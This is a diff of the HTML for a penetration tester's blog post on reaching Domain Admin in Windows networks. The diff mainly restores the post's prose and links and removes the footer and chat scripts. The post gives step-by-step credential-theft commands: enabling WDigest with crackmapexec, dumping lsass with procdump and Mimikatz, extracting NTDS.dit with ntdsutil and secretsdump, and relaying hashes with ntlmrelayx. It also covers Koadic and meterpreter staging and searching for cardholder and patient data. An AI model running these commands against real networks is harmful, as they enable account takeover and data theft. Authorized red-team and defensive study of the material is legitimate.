@@ -12,8 +12,7 @@
 <meta
   name="description"
   content="So I was recently on an internal assessment (Thanks Hexcartel) and got to do some cool tricks I felt like sharing. Behold some tricks:
-Dumping Lsass on Windows 10 😋 # Quick and Easy # Procdump # Getting The Dump Back 👈 # So here&amp;rsquo;s the TLDR steps to do all this:
-Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=enable Wait a while for the target user to auth to their system Use smbclient or Crackmapexec or whatever to upload Procdump and dump lsass with it: C:\users\ANOTHER-USER\desktop\procdump."
+Dumping Lsass on Windows 10 😋 # Quick and Easy # So, we all know you can&amp;rsquo;t just blast Crackmapexec and attach a C2 stager and get shells raining like you could in an unpatched Windows 7 network. See my post on &amp;ldquo;How I use Koadic on Internals&amp;rdquo; for that; No, on Windows 10 we have to be a little more sophisticated."
 />
 <meta
   name="keywords"
@@ -50,15 +49,13 @@ Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=en
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Helpful Tricks I Use to Get Domain Admin"/>
 <meta name="twitter:description" content="So I was recently on an internal assessment (Thanks Hexcartel) and got to do some cool tricks I felt like sharing. Behold some tricks:
-Dumping Lsass on Windows 10 😋 # Quick and Easy # Procdump # Getting The Dump Back 👈 # So here&rsquo;s the TLDR steps to do all this:
-Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=enable Wait a while for the target user to auth to their system Use smbclient or Crackmapexec or whatever to upload Procdump and dump lsass with it: C:\users\ANOTHER-USER\desktop\procdump."/>
+Dumping Lsass on Windows 10 😋 # Quick and Easy # So, we all know you can&rsquo;t just blast Crackmapexec and attach a C2 stager and get shells raining like you could in an unpatched Windows 7 network. See my post on &ldquo;How I use Koadic on Internals&rdquo; for that; No, on Windows 10 we have to be a little more sophisticated."/>
 
 
 
 <meta property="og:title" content="Helpful Tricks I Use to Get Domain Admin" />
 <meta property="og:description" content="So I was recently on an internal assessment (Thanks Hexcartel) and got to do some cool tricks I felt like sharing. Behold some tricks:
-Dumping Lsass on Windows 10 😋 # Quick and Easy # Procdump # Getting The Dump Back 👈 # So here&rsquo;s the TLDR steps to do all this:
-Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=enable Wait a while for the target user to auth to their system Use smbclient or Crackmapexec or whatever to upload Procdump and dump lsass with it: C:\users\ANOTHER-USER\desktop\procdump." />
+Dumping Lsass on Windows 10 😋 # Quick and Easy # So, we all know you can&rsquo;t just blast Crackmapexec and attach a C2 stager and get shells raining like you could in an unpatched Windows 7 network. See my post on &ldquo;How I use Koadic on Internals&rdquo; for that; No, on Windows 10 we have to be a little more sophisticated." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/helpful-tricks-i-use-to-get-domain-admin/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2019-10-07T18:22:27-05:00" />
@@ -182,8 +179,6 @@ Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=en
         </span>
 
         
-          
-        
       
 
       
@@ -191,7 +186,7 @@ Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=en
 
       
         <span class="post-read-time"
-          >— 6 min read</span
+          >— 10 min read</span
         >
       
     </div>
@@ -202,28 +197,28 @@ Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=en
 
     <div class="post-content">
       
-      <p>So I was recently on an internal assessment (Thanks <!-- raw HTML omitted -->Hexcartel<!-- raw HTML omitted -->) and got to do some cool tricks I felt like sharing. Behold some tricks:</p>
+      <p>So I was recently on an internal assessment (Thanks <a href="https://twitter.com/hexcartel">Hexcartel</a>) and got to do some cool tricks I felt like sharing. Behold some tricks:</p>
 <h3 id="dumping-lsass-on-windows-10-">
   Dumping Lsass on Windows 10 😋
   <a href="#dumping-lsass-on-windows-10-" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<h4 id="quick-and-easy">
+<h3 id="quick-and-easy">
   Quick and Easy
   <a href="#quick-and-easy" class="h-anchor" aria-hidden="true">#</a>
-</h4>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+</h3>
+<p>So, we all know you can&rsquo;t just blast <a href="">Crackmapexec</a> and attach a C2 stager and get shells raining like you could in an unpatched Windows 7 network. See my post on <a href="../how-i-use-koadic-on-internals">&ldquo;How I use Koadic on Internals&rdquo;</a> for that; No, on Windows 10 we have to be a little more sophisticated. So, let&rsquo;s say you&rsquo;ve gotten local admin creds to a system and there&rsquo;s another Domain Admin that uses the same system but you can&rsquo;t seem to find a way to get their creds. Well, since you have local admin to that box you can use <code>Crackmapexec</code> to enable wdigest on that system so that next time the user auths&rsquo; to that system their creds will get stored in memory and you&rsquo;ll be able to dump them.</p>
+<p>In dumping their creds you actually have a few ways of doing it. If you want to do this easily you can simply RDP into the host after hours, open up task-manager, right mouse-click on lsass.exe on the <code>details</code> tab, and select <code>create dump file</code>. That&rsquo;ll create a dump file of the lsass.exe process which you can then use Mimikatz against the dump file on your local attacking machine to get some plain-text creds; done.</p>
 <h4 id="procdump">
   Procdump
   <a href="#procdump" class="h-anchor" aria-hidden="true">#</a>
 </h4>
-<!-- raw HTML omitted -->
+<p>The other way is to use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a> [Thanks <a href="http://www.n00py.io/">N00py</a>] to create the dump file. This is a great tool that will go undetected being that it is a Microsoft SysInternals tool. Every time I do this process I use this <a href="https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php">ARTICLE</a> which walks through the process of dumping lsass with Procdump and dumping the creds locally with Mimikatz. It&rsquo;s basically a <b>TLDR</b> of this tip. Using procdump instead of RDPing will allow for more creativity in creating the dump file you need as you can now use the command line in this process.</p>
 <h4 id="getting-the-dump-back-">
   Getting The Dump Back 👈
   <a href="#getting-the-dump-back-" class="h-anchor" aria-hidden="true">#</a>
 </h4>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<p>So a great way to get the file back off the Windows 10 system is to use <code>smbclient</code>. I often completely forget about smbclient when working on internals. I guess it gets overshadowed by the sexiness of Crackmapexec but it&rsquo;s good for downloading files really quickly. Another way is to use SCP since Windows 10 now comes with SSH tools. Usually with these two methods you should be good on getting the file back to your attacking machine. If those won&rsquo;t work Bitsadmin? Powershell&hellip;time to Google&hellip;</p>
+<p>Once you get the file locally you&rsquo;ll wanna get it to a local Windows system that has Mimikatz on it <i>(Comment below if you can do this on Linux)</i>. Once you have everything ready follow the steps <a href="https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php">here</a> or below.</p>
 <p>So here&rsquo;s the TLDR steps to do all this:</p>
 <h4 id="steps-">
   Steps 👟
@@ -235,10 +230,10 @@ Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=en
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb TARGETHOST -M wdigest -o ACTION<span style="color:#f92672">=</span>enable
 </span></span></code></pre></div><ol start="2">
 <li>Wait a while for the target user to auth to their system</li>
-<li>Use smbclient or Crackmapexec or whatever to upload <!-- raw HTML omitted -->Procdump<!-- raw HTML omitted --> and dump lsass with it:</li>
+<li>Use smbclient or Crackmapexec or whatever to upload <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a> and dump lsass with it:</li>
 </ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\A</span>NOTHER-USER<span style="color:#ae81ff">\d</span>esktop<span style="color:#ae81ff">\p</span>rocdump.exe -accepteula -ma lsass.exe lsass.dmp
-</span></span></code></pre></div><p><!-- raw HTML omitted --> OR&hellip;<!-- raw HTML omitted -->
+</span></span></code></pre></div><p><b> OR&hellip;</b>
 4. After hours, RDP in to the target system ➡ Open Task-manager and go to Details tab ➡ Right mouse-click and dump lsass.exe</p>
 <ol start="5">
 <li>Download the dump file to your attacking machine</li>
@@ -248,21 +243,28 @@ Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=en
 </span></span><span style="display:flex;"><span>Switch to minidump
 </span></span><span style="display:flex;"><span>mimikatz $ sekurlsa::logonPasswords
 </span></span></code></pre></div><ol start="7">
-<li><!-- raw HTML omitted -->LOOK CLOSELY<!-- raw HTML omitted --> to the output. <!-- raw HTML omitted -->IF YOU DO NOT LOOK CLOSELY YOU COULD MISS A DOMAIN ADMIN CRED!!!<!-- raw HTML omitted --> A good tip to make sure you&rsquo;re not missing anything is to copy everything to your local Linux system and use <code>grep</code> to grep for passwords. I usually do:</li>
+<li><u>LOOK CLOSELY</u> to the output. <b>IF YOU DO NOT LOOK CLOSELY YOU COULD MISS A DOMAIN ADMIN CRED!!!</b> A good tip to make sure you&rsquo;re not missing anything is to copy everything to your local Linux system and use <code>grep</code> to grep for passwords. I usually do:</li>
 </ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat mimikatz_output.txt | grep -i password -B2
-</span></span></code></pre></div><!-- raw HTML omitted -->
+</span></span></code></pre></div><p>This will show both the usernames and passwords that were dumped. If the user logged in during the time between you enabling wdigest and dumping lsass you should have the target user&rsquo;s creds in plain-text!</p>
 <h4 id="notes-">
   Notes 📝
   <a href="#notes-" class="h-anchor" aria-hidden="true">#</a>
 </h4>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<p>One thing to note about having Mimikatz on Windows 10: You&rsquo;ll need to white-list a folder in your defender settings so it doesn&rsquo;t keep getting popped by your own AV. I&rsquo;m also sure there&rsquo;s someone out there that would read all this and say&hellip;&ldquo;Why don&rsquo;t you just use/do XYZ to do all this instantly?&rdquo; To you I say, &ldquo;leave a comment below! Grace us with your knowledge and wisdom!&rdquo;</p>
+<center>
+<figure>
+<img src="../../images/Wallpapers/nice_view.jpg" alt="Wallpaper" />
+<figcaption>
+<center>You Found A Wallpaper!</center>
+</figcaption>
+</figure>
+</center>
 <h3 id="dumping-ntds-manually-with-a-native-windows-tool">
   Dumping NTDS Manually With A Native Windows Tool
   <a href="#dumping-ntds-manually-with-a-native-windows-tool" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<!-- raw HTML omitted -->
+<p>Sometimes, due to anti-virus or restrictions against tools, you are unable to use Crackmapexec to dump the DC when that time comes. Sometimes you may have to dump it manually and a great way to do this is by using another native Windows tool by the name of <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753343(v=ws.10)?redirectedfrom=MSDN">NTDSUTIL</a>. If you have the time you can read this <a href="https://www.cyberis.co.uk/2014/02/obtaining-ntdsdit-using-in-built.html">ARTICLE</a> on this:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>C:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>Posh<span style="color:#f92672">&gt;</span> ntds
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span>ntds<span style="color:#960050;background-color:#1e0010">&#39;</span> is not recognized as an internal or external command,
 </span></span><span style="display:flex;"><span>operable program or batch file.
@@ -307,7 +309,7 @@ Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=en
 </span></span><span style="display:flex;"><span>smb: <span style="color:#960050;background-color:#1e0010">\</span>dumpty<span style="color:#960050;background-color:#1e0010">\</span>registry<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">&gt;</span> get SYSTEM
 </span></span><span style="display:flex;"><span>getting file <span style="color:#960050;background-color:#1e0010">\</span>dumpty<span style="color:#960050;background-color:#1e0010">\</span>registry<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM of size <span style="color:#ae81ff">9961472</span> as SYSTEM (<span style="color:#ae81ff">54044.4</span> KiloBytes<span style="color:#f92672">/</span>sec) (average <span style="color:#ae81ff">52547.4</span> KiloBytes<span style="color:#f92672">/</span>sec)
 </span></span><span style="display:flex;"><span>smb: <span style="color:#960050;background-color:#1e0010">\</span>dumpty<span style="color:#960050;background-color:#1e0010">\</span>Active Directory<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">&gt;</span> exit
-</span></span></code></pre></div><p>Next you&rsquo;ll use all three of these files when using <!-- raw HTML omitted -->secretsdump.py<!-- raw HTML omitted --> to dump the domain&rsquo;s AD credentials locally on your attacking machine:</p>
+</span></span></code></pre></div><p>Next you&rsquo;ll use all three of these files when using <a href="https://github.com/SecureAuthCorp/impacket">secretsdump.py</a> to dump the domain&rsquo;s AD credentials locally on your attacking machine:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">⋊</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">~/</span>C<span style="color:#f92672">/</span>CREDS python <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>doc<span style="color:#f92672">/</span>python<span style="color:#f92672">-</span>impacket<span style="color:#f92672">/</span>examples<span style="color:#f92672">/</span>secretsdump.py <span style="color:#f92672">-</span>ntds ntds.dit <span style="color:#f92672">-</span>system SYSTEM <span style="color:#f92672">-</span>security SECURITY LOCAL
 </span></span><span style="display:flex;"><span>Impacket v0<span style="color:#ae81ff">.9.19</span> <span style="color:#f92672">-</span> Copyright <span style="color:#ae81ff">2019</span> SecureAuth Corporation
 </span></span><span style="display:flex;"><span>
@@ -322,7 +324,14 @@ Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=en
   <a href="#notes--1" class="h-anchor" aria-hidden="true">#</a>
 </h4>
 <p>Dumping this way locally may take a long time depending on what kind of setup you have. It won&rsquo;t be lightning fast like crackmapexec is so don&rsquo;t be shocked by this behavior.</p>
-<!-- raw HTML omitted -->
+<center>
+<figure>
+<img src="../../images/Wallpapers/mountains.jpeg" alt="Wallpaper" />
+<figcaption>
+<center>You Found Another Wallpaper!</center>
+</figcaption>
+</figure>
+</center>
 <h3 id="saving-the-hashes-you-relay-">
   Saving the Hashes you Relay 💼
   <a href="#saving-the-hashes-you-relay-" class="h-anchor" aria-hidden="true">#</a>
@@ -397,21 +406,20 @@ Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=en
 </span></span><span style="display:flex;"><span>                        see who is <span style="color:#f92672">(</span>only works pre Win <span style="color:#ae81ff">10</span> Anniversary<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>...snip...
-</span></span></code></pre></div><!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+</span></span></code></pre></div><p>Yea so, looking at the flags, you can use <code>-of</code> to specify an output file location where NTLMrelayX will save your relayed hashes! That way if you have issues relaying commands or your target has some sort of antivirus blocking your attempts you still have a chance to crack the hashes later.</p>
+<p>Another interesting flag is the <code>&ndash;enum-local-admins</code> flag. NTLMrelayX will do enumeration to try to figure out who the local admin is if the hashes you capture are low privileged! Sometimes it will fail and sometimes it won&rsquo;t but it&rsquo;s better to have than not, that&rsquo;s for sure!</p>
+<p>The last flag I noticed recently was the <code>-i</code> flag which will open up an smbclient session upon successful relay. I haven&rsquo;t played with this yet but it sounds useful. Sometimes when <code>-c</code> commands aren&rsquo;t working this would be a useful alternative to start uploading or downloading some files. Sometimes admins leave big juicy password.xlsx files on their desktops that contain DA creds. This flag would be great!</p>
 <h3 id="using-koadic-and-bloodhound-on-windows-servers-">
   Using Koadic and Bloodhound on Windows Servers 💣
   <a href="#using-koadic-and-bloodhound-on-windows-servers-" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<!-- raw HTML omitted -->
-<p>Similarly, these servers may be a good place to set up shop for a while and start doing some further enumeration. These servers will similarly be more accepting of things like BloodHound ingestors and maybe, dare I say, meterpreter payloads. You could also use these for <!-- raw HTML omitted -->PowerupSQL<!-- raw HTML omitted --> sessions if you&rsquo;re hunting for sensitive information such as card holder data or patient health information.</p>
-<!-- raw HTML omitted -->
+<p>More often than not if you get access to a Windows Server 2008-2012 box they usually lack strong Anti-virus provisions in place. They don&rsquo;t come with Windows Defender like a normal Windows 10 box would or anything like that so most of the time you can use a mshta stager in Koadic to quickly dump memory with the Mimikatz module or use the enum_domain_info module to quickly develop a strong foundation of information.</p>
+<p>Similarly, these servers may be a good place to set up shop for a while and start doing some further enumeration. These servers will similarly be more accepting of things like BloodHound ingestors and maybe, dare I say, meterpreter payloads. You could also use these for <a href="https://github.com/NetSPI/PowerUpSQL">PowerupSQL</a> sessions if you&rsquo;re hunting for sensitive information such as card holder data or patient health information.</p>
 <h3 id="smbclient-for-file-transfers-">
   SMBCLIENT For File Transfers 💽
   <a href="#smbclient-for-file-transfers-" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<!-- raw HTML omitted -->
+<p>It can be a real pain getting files off a Windows machine back on to your local attacking machine and having used crackmapexec for hours getting RCE everywhere it&rsquo;s easy to forget about ol&rsquo; smbclient. But smbclient can be a great companion when downloading and uploading files quickly. Also, knowing how to recursively download and upload helps too. So the tip, type these words (flags) in next time you use smbclient to enable recursive interactivity. These commands toggle so type them in again if you need to disable them as well:</p>
 <pre tabindex="0"><code>*   Recurse  # flag to toggle on recursion
 *   Prompt   # flag to toggle off prompts
 *   mput/mget  # Command used to get and put multiple files
@@ -438,78 +446,8 @@ Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=en
 </span></span></code></pre></div>
     </div>
     
-      
-        <div class="pagination">
-          <div class="pagination__title">
-            <span class="pagination__title-h"
-              >Read other posts</span
-            >
-            <hr />
-          </div>
-          <div class="pagination__buttons">
-            
-              <span class="button previous">
-                <a href="/posts/how-to-phish-using-a-jump-box-part-2/">
-                  <span class="button__icon">←</span>
-                  <span class="button__text">How to Phish Using a Jump Box Part 2</span>
-                </a>
-              </span>
-            
-            
-              <span class="button next">
-                <a href="/posts/kiosk-escapes-pt-3-mexico-edition/">
-                  <span class="button__text">Kiosk Escapes Pt. 3 - Mexico Edition!!</span>
-                  <span class="button__icon">→</span>
-                </a>
-              </span>
-            
-          </div>
-        </div>
-      
-    
 
     
-      
-        <script src="https://utteranc.es/client.js"
-        repo="clutchisback1/h4cklife.org"
-        issue-term="pathname"
-        label="general-comment"
-	theme="github-dark"
-        crossorigin="anonymous"
-        async>
-</script>
-
-
-
-
-<script>
-"use strict";
-
-!function() {
-  var t = window.driftt = window.drift = window.driftt || [];
-  if (!t.init) {
-    if (t.invoked) return void (window.console && console.error && console.error("Drift snippet included twice."));
-    t.invoked = !0, t.methods = [ "identify", "config", "track", "reset", "debug", "show", "ping", "page", "hide", "off", "on" ], 
-    t.factory = function(e) {
-      return function() {
-        var n = Array.prototype.slice.call(arguments);
-        return n.unshift(e), t.push(n), t;
-      };
-    }, t.methods.forEach(function(e) {
-      t[e] = t.factory(e);
-    }), t.load = function(t) {
-      var e = 3e5, n = Math.ceil(new Date() / e) * e, o = document.createElement("script");
-      o.type = "text/javascript", o.async = !0, o.crossorigin = "anonymous", o.src = "https://js.driftt.com/include/" + n + "/" + t + ".js";
-      var i = document.getElementsByTagName("script")[0];
-      i.parentNode.insertBefore(o, i);
-    };
-  }
-}();
-drift.SNIPPET_VERSION = '0.3.1';
-drift.load('2pa2ip2k9udy');
-</script>
-
-
       
     
   </div>
